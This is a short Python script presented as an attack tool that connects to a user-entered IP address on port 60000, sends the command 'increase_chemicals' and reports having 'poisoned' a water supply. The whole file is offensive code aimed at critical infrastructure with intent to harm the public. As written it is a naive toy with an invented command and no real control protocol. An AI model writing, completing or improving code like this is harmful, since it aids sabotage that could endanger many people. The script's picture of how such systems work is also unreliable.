import socket
import sys

def poison_water_supply(target):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, 60000))
        s.send(b"increase_chemicals")
        print(f"Poisoned water supply at {target}")
        s.close()
    except socket.error:
        print("Couldn't connect to server.")
        sys.exit()

def main():
    target = input("Enter target IP: ")
    poison_water_supply(target)

if __name__ == "__main__":
    main()
